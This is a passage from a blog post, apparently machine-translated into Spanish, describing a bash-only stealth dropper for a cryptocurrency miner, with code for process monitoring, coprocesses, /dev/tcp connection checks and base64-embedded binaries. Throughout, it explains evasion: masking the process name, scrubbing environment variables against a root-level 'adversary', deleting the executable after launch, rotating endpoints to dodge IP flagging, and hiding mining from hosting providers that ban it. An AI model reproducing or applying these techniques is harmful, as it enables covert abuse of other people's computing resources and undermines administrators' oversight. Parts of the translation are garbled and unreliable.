    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Durmiendo sin bifurcar, al abusar de la funcionalidad de tiempo de espera de la lectura incorporada, utiliza un descriptor de archivo dedicado y debemos asegurarnos de que esté disponible para evitar la terminación.<p>Hay funciones como<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> se utilizan para monitorear el uso del sistema, todos estos hacen uso de linux<code>/proc</code> archivos sin herramientas como<code>ps</code> , así que sin bifurcaciones, todo puro bash.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Los coprocesos están disponibles desde bash<code>v4</code> , son como trabajos, excepto que tienen un nombre y sus propios descriptores de archivo.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>Estamos escribiendo un demonio, que es un proceso de larga duración, y estamos usando muchos descriptores de archivos, realmente queremos hacer algunas limpiezas para evitar incurrir en<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ulimits</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>Esta función se basa en<a href=https://ipinfo.io/> ipinfo</a> para determinar la región del trabajador, lo que permite ajustar alguna lógica dependiente de la región,<a href=\assets/posts/geoip.json> geoip.json</a> agrupa países en regiones, ya que queremos la región de nivel superior y no estamos interesados ​​en el país específico.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    <span class=hljs-built_in>timeout</span> 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Bash tiene soporte para conexiones tcp, al tener una abstracción sobre<code>/dev/tcp</code> (también para udp, pero la mayoría parece estar deshabilitado en el momento de la compilación, por lo que no puede confiar en él). Estos archivos son cosa de bash, no son parte de linux<code>/dev</code> árbol.<p>Vale la pena mencionar también un sistema de bloqueo para manejar la concurrencia entre trabajos de bash. Para permitir que varios trabajos funcionen con bloqueos, todos deben compartir un descriptor de archivo, por lo que nuestro<code>locker</code> que también es un trabajo, debe iniciarse antes que otros trabajos que deseen utilizar la cerradura. El casillero simplemente sigue leyendo<code>stdin</code> esperando solicitudes de bloqueo, respondiendo en<code>stdout</code> dependiendo del estado booleano actual almacenado en una variable. No garantizo que este enfoque sea libre de carreras, pero parece funcionar de manera decente, por otro lado, he encontrado que los descriptores de archivos no son muy confiables, ya que sospecho que hay algunos búferes que no se vacían en algún lugar del<em> tubería</em> y eventualmente llegar a puntos muertos (lo que significa que no puede confiar en que el casillero le dé una respuesta todo el tiempo).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Limpia tu basura ... los programas de bash complejos terminan usando muchas variables, y si abusas del espacio global, se hincha. Si está generando trabajos de shell, estos heredan todo el entorno (que está efectivamente duplicado, no compartido), puede terminar rápidamente comiendo bash<code>100M</code> de memoria, no agradable. También queremos ser de bajo perfil. En nuestro escenario de despliegue, el adversario<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> potencialmente puede tener acceso de root e información completa sobre nuestros procesos<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> y ya sabe ... cada proceso contiene información sobre el comando completo que lo inició y las variables de entorno exportadas.<h2 id=configuration><a class=header-anchor href=#configuration> Configuración</a></h2><p>Una vez que tenemos nuestro entorno y nuestras herramientas, tenemos que ajustar nuestro minero para la máquina en la que se está ejecutando, pasos de configuración en pseudocódigo:<ul><li><p>nombre del proceso para el minero<li><p>información del host (ram / cores / caches /<code>ENV_VARS</code>)<li><p>versión de configuración<li><p><code>worker_id</code> para el minero (de ip y host)<li><p>ip / puerto para la conexión</ul><p>Es necesario elegir un nombre para el proceso<em> esconder</em> el hecho de que estamos ejecutando un minero, pero no solo estamos cambiando el nombre de nuestro binario, tenemos una lista de<strong> mascaras</strong> para candidatos potenciales (un archivo de texto sin formato donde cada línea es una máscara):<ul><li><p>elige una máscara al azar<li><p>baraja los elementos de la cola de la cadena (todos excepto el primero) para obtener un comando de proceso diverso. Ahora tenemos una cadena que parece<code>cmd --arg2 --arg1 --arg3</code> . Esta es nuestra máscara de minero, ejecutamos el binario<em> sin</em> argumentos, pero parece que iniciamos un comando<code>cmd</code> con argumentos<code>--arg1 --arg2 --arg3</code>. Se permiten espacios y guiones en los nombres de los archivos, por lo que está bien ejecutar un binario con este nombre, no parece que Linux distinga entre el ejecutable y los argumentos al almacenar los comandos del proceso.<p>La configuración del minero se carga automáticamente desde<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> Tasa de hash</a></h3><p>, con el tiempo, el minero aguas arriba consiguió muchos<strong> sintonización automática</strong> características, por lo que hizo que parte de mis scripts fueran redundantes, pero la diferencia entre upstream y downstream aquí es que el objetivo de upstream es maximizar<em> rendimiento</em> , mientras que nuestro objetivo es maximizar<em> eficiencia y ofuscación</em> , no queremos adelantar al sistema, queremos sangrar un poco sin interrumpir el servicio.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>Para ello, necesitamos una comprensión más granular del medio ambiente, la<code>l2/l3</code> estructura de caché del procesador, la memoria RAM y los núcleos, y el procesador actual<em> promedio</em> carga y cpu<em> uso</em> . Intenté construir un<a href=https://en.wikipedia.org/wiki/Finite-state_machine> máquina estatal</a> en bash que comenzaría desde lo mínimo y probaría diferentes configuraciones lentamente estableciéndose en el promedio mejor. Era un<strong> enorme</strong> desperdicio de esfuerzo plagado de<a href=https://en.wikipedia.org/wiki/Technical_debt> deuda técnica</a> que se fue a la quiebra muy rápidamente y en su mayoría se descartó, con solo restos persistentes en el código base.<p>Frack todo este jumbo de ajuste automático, acabamos de hacer que el minero duerma dependiendo del uso / carga del host, esto requirió modificaciones del minero para<code>sleep</code> entre subprocesos rendimientos, y algunas correcciones al perro guardián de la configuración<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , lo que nos permitiría recargar la cantidad de sueño en tiempo de ejecución. La lógica está mucho más simplificada y se ve así:<ul><li><p>si el uso es superior / inferior a $ TARGET_USAGE (± margen de error) aumentar / disminuir el sueño<li><p>si la carga media dentro<code>1m</code> está por encima / por debajo de $ TARGET_LOAD pausar / reanudar la extracción</ul><h3 id=connection><a class=header-anchor href=#connection> Conexión</a></h3><p>En nuestro resumen de bash mostramos utilidades para la conexión. ¿Por qué los necesitamos? Porque necesitamos diversidad; simplemente codificar un punto final en la configuración no durará mucho, cuando algo parece sospechoso y tiene actividad en la red, las direcciones IP se marcan.<p>Al principio experimentamos con un par de métodos:<ul><li><p>utilizando<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> cadenas de proxy</a> para sobrecargar las llamadas de la red del minero, pero requería que el minero se construyera con bibliotecas dinámicas, y tenía que enviarlas con la carga útil, por lo que no era práctico.<li><p>ejecutando un<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> túnel de avance</a> codo con codo con el minero: esto tenía mucha sobrecarga de configuración, ya que ahora estábamos configurando dos procesos en cada implementación, lo que equivalía a más errores.</ul><p>Al final, nos decidimos por enviar una lista de puntos finales, almacenados en variables bash, eligiendo uno al azar. Las conexiones, por supuesto, estaban encriptadas. ¿Cuáles son estos puntos finales? Reenviadores al proxy que manejaría los trabajos de los mineros.<p>¿Por qué necesitamos un<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> proxy de minería</a> ? Realmente nunca pasé de ~ 100 conexiones simultáneas, por lo que un proxy no era realmente necesario para la carga de la red, pero era conveniente para negociar el algoritmo hash y proporcionar diferentes objetivos de dificultad a diferentes mineros, para evitar que los mineros trabajaran en<strong> dificultad</strong> objetivos que les llevaría demasiado tiempo completar y evitar el riesgo de desperdiciar cálculos en trabajos sin terminar.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> El software del grupo también requirió algunas modificaciones, ya que felizmente anunciaba ser un proxy en solicitudes http simples ...<em> que tenía que ser agotado</em> , y una bifurcación agregó control de acceso, por lo que basamos nuestras modificaciones en eso.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> Editando json</a></h3><p>Al aplicar modificaciones a un archivo json con solo bash, nos las arreglamos con algunas sustituciones de var env y algunas expresiones regulares. Inicialmente confiábamos en un<code>envsubst</code> binario para aplicar variables, luego hicimos bash completo<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> con esta lógica:<ul><li><p>leer plantilla de configuración<li><p>reemplace todas las comillas con una cadena muy esotérica (como<code>_#_#</code>)<li><p><code>eval</code> la plantilla<li><p>reemplace todas las ocurrencias esotéricas con comillas</ul><p>Además de evitar subprocesos, otra ventaja es que obtenemos capacidades bash completas en nuestras plantillas. Para leer y escribir sin plantillas, tenemos que confiar en las capacidades de bash regex:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Esto solo nos permite editar líneas individuales, para entradas de varias líneas solo considera la primera línea ... pero es lo suficientemente bueno para nuestro caso de uso.<h2 id=runtime><a class=header-anchor href=#runtime> Tiempo de ejecución</a></h2><p>¿Cómo es nuestro tiempo de ejecución? Tenemos un proceso bash principal que ejecuta el bucle principal, luego el subproceso minero, el subproceso del monitor de la CPU, el casillero y el sintonizador. Eso es casi un puñado.<p>Primero, queremos asegurarnos de que si algo sale mal, no dejamos un lío, esto significa que usamos una trampa de bash para realizar limpiezas en la terminación.<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> desactiva la trampa para evitar la recursividad. La trampa mata todos los trabajos y elimina el entorno de trabajo.<p>Es hora de iniciar el minero, que se almacena como una variable bash en la codificación base64. Lo volcamos en el sistema de archivos, luego volcamos la configuración, ejecutamos el minero y eliminamos tanto el minero como la configuración. En Linux, puede eliminar el ejecutable de un proceso en ejecución (en Windows, esto no está permitido).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup>Cuando el minero se está ejecutando, en el sistema de archivos solo hay un<code>.. /</code> directorio con un<code>b64</code> enlace en él.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Una peculiaridad enloquecedora que se encuentra con bash al codificar el minero es que asignar una variable con una subcapa con comillas<code>myvar="$(something)"</code> provoca un aumento permanente en el uso de la memoria, esto fue difícil de depurar y realmente no he encontrado la razón por la que se comporta así, de todos modos la asignación debe estar sin comillas. En cambio, la decodificación se realiza con<em> herestrings</em> que es una abstracción sobre archivos temporales, la variable se vuelca en un archivo que luego se canaliza de nuevo al proceso.<p>El bucle de larga duración del minero:<ul><li><p>si bien es cierto<ul><li><p>detener minero<li><p>eliminar config<li><p>iniciar minero<li><p>si bien es cierto<ul><li><p>iniciar demonio<ul><li><p>mientras el minero esta corriendo<ul><li><p>leer la salida del minero<li><p>elija la acción del minero en función de la línea de salida</ul></ul><li><p>si el minero no se está ejecutando: romper</ul><li><p>dormir</ul></ul><p>La línea de salida se compara con algunas expresiones regulares:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>El demonio maneja casos donde<ul><li><p>la conexión al punto final da errores (elija un nuevo punto final aleatorio)<li><p>el algoritmo hash cambia (ajusta el tiempo de reposo y las configuraciones ad-hoc)<li><p>Problemas con el minero (reiniciar el minero).</ul><p>Durante un tiempo hubo soporte para el tablero de comando y control, lo que permitió desencadenar reinicios manuales, sin embargo, dado que su uso fue mínimo, se descartó y sus puntos finales fueron reemplazados por una conexión de grupo alternativa, además el proceso de reinicio fue inestable, complejo. ..otro ejemplo de deuda tecnológica. Sin embargo, permitió recuperar una carga útil actualizada y volver a configurar todas las configuraciones sobre la marcha, lo cual fue bastante bueno, el trampolín definitivo.<h2 id=debugging><a class=header-anchor href=#debugging> Depuración</a></h2><p>Hay tres utilidades principales<ul><li><p>habilitar / deshabilitar el rastreo alrededor de bloques de código (no queremos rastrear un binario codificado en b64 en una variable ..)<li><p>una función simple para formatear registros<li><p>una bandera que activaría el registro detallado en tiempo de ejecución cada vez que se iniciara el minero.<ul><li><p>hace el archivo<code>.debug</code> ¿existe?<ul><li><p>habilitar el registro detallado</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Implementaciones de destino</a></h2><p>Esta configuración se ha probado en 3 tipos de hosts:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Contenedores o máquinas virtuales autohospedados</a></h3><p>A muchos proveedores de alojamiento no les gusta la minería, ya que los recursos de la CPU tienden a compartirse entre varios usuarios, y el software de minería puede ralentizar fácilmente un nodo host que afecta el rendimiento del resto de los usuarios. Esto puede ser cierto incluso si el tiempo del usuario de la CPU es ilimitado, porque los algoritmos hash pueden saturar todas las capas de almacenamiento en caché de la CPU si la caché se comparte entre todos los núcleos de la CPU.<p>Nos gustaría usar nuestro<em> justa</em> compartir recursos sin ser baneado, ese es un buen caso de uso para nuestro cuentagotas sigiloso, ya que es consciente del 